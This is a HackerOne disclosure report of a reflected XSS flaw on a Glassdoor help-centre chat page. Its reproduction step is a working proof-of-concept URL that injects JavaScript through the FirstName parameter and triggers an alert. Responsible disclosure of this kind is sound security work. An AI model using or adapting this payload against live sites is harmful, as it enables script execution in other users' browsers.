# Reflected XSS on https://help.glassdoor.com/GD_HC_EmbeddedChatVF

## Report Details
- **Report ID**: 1244053
- **URL**: https://hackerone.com/reports/1244053
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-06-25T10:01:47.300Z
- **Disclosed**: 2021-07-01T14:48:46.519Z

## Reporter
- **Username**: l0cpd
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: glassdoor

## Vulnerability Information
Hi there,
I have found the xss vulnerability at: `https://help.glassdoor.com/GD_HC_EmbeddedChatVF`

**Browsers tested:** Firefox, Chrome, Edge (latest version)

## Steps To Reproduce:
Go to: `https://help.glassdoor.com/GD_HC_EmbeddedChatVF?FirstName=l0cpd%22};a=alert,b=document.domain,a(b)//`

## Supporting Material/References (screenshots, logs, videos):
{F1352792}

Regards,
@l0cpd

## Impact

The attacker can execute JS code.

## Attachments
- firefox_LDd0w4rMHT.png
